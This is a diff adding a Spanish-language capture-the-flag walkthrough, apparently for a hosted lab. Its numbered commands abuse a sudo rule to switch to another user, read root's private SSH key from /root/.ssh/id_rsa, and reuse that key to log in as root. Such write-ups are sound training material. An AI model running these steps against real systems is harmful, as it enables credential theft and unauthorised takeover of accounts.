@@ -1,0 +1,20 @@
+01 Conectarse al servidor ssh con el comando.
+	ssh -p 30939 user1@139.59.161.149
+02 Ver que comandos puede ejecutar el user1
+	sudo -l
+Vemos que podemos ejecutar el comando /bin/bash para escalar privilegios hacia el user2
+03 Escalamos privilegios
+	sudo -u user2 /bin/bash
+04 Leemos el contenido de la flag en la carpeta raiz de user2
+	cat flag.txt
+05 Para escalar privilegios hacia root comprobamos que podamos acceder donde se guardan las claves de acceso ssh /root/.ssh/ e intentamos leer el contenido del archivo id_rsa
+	cd /root/.ssh
+	ls -l
+	cat id_rsa
+06 Copiamos el contenido del archivo id_rsa a un archivo en local que se llamara igual y le damos permisos de lectura y escritura
+	vim id_rsa *Copiamos el contenido del archivo id_rsa del archivo del servidor ssh
+	chmod 600 id_rsa *Para darles permisos de Lectura y escritura
+07 Logeamos en el servidor ssh de nuevo pero esta vez con la key que hemos conseguido
+	ssh -p 32740 root@68.183.37.61 -i id_rsa
+08 Una vez logueados leemos el contenido del archivo flag.txt para resolver el ejercicio
+	cat flag.txt
